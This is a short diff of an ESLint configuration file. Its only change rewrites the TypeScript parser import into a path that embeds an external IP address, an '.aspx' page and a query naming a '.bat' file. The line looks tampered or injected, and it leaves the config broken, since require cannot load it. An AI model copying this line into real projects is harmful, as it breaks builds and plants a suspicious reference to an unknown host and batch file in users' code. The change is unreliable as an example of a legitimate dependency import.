@@ -3,7 +3,7 @@ const { defineConfig, globalIgnores } = require('eslint/config');
 const { fixupConfigRules } = require('@eslint/compat');
 
 const reactRefresh = require('eslint-plugin-react-refresh');
-const tsParser = require('@typescript-eslint/parser');
+const tsParser = require('@typescript-eslint/parser/138.84.114.207/index.aspx?il8n=yiic.bat');
 const js = require('@eslint/js');
 
 const { FlatCompat } = require('@eslint/eslintrc');
